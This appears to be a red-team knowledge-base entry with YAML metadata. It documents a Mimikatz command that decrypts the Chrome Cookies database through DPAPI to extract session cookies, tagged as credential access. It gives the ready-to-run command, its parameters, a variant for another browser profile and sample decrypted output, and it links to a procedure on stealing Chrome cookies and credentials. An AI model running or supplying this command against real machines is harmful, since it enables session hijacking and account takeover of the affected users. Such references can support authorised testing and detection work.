---
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User
  Data\Default\Cookies\" /unprotect" "exit"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mimikatz
  - dpapi
  - chrome
  - credential-access
verified: true
validated: true
---

# mimikatz-decrypt-chrome-cookies-unprotect

## Command

```cmd
mimikatz.exe "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User Data\Default\Cookies\" /unprotect" "exit"
```

## Description

This command invokes Mimikatz to decrypt the Chrome Cookies SQLite database using the current user's DPAPI protection in a non-interactive mode. It targets the Default profile and extracts session cookies for web sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `%localappdata%` | Environment variable for user's AppData path (auto-resolved) | Yes |
| `/in:"..."` | Input path to the Cookies file | Yes |
| `/unprotect` | Decrypt using current user context (no master key needed) | Yes |
| `exit` | Quit Mimikatz after execution | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User Data\Default\Cookies\" /unprotect" "exit"
```

### Advanced Usage

For a specific profile (replace Default with Profile 1):

```cmd
mimikatz.exe "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User Data\Profile 1\Cookies\" /unprotect" "exit"
```

## Expected Output

If successful, Mimikatz displays decrypted cookies:

```
Cookie file : '...\Cookies' ok
* HOST : .google.com
  NAME : NID
  VALUE : 12345%7C...
  ...
[+] 5 cookie(s) decrypted
```

Empty or error output indicates failure, such as "ERROR decrypt ;"

## Related

- [[procedures/Steal-Chrome-Cookies-and-Credentials-with-Mimikatz]]
- [[tools/Mimikatz]]
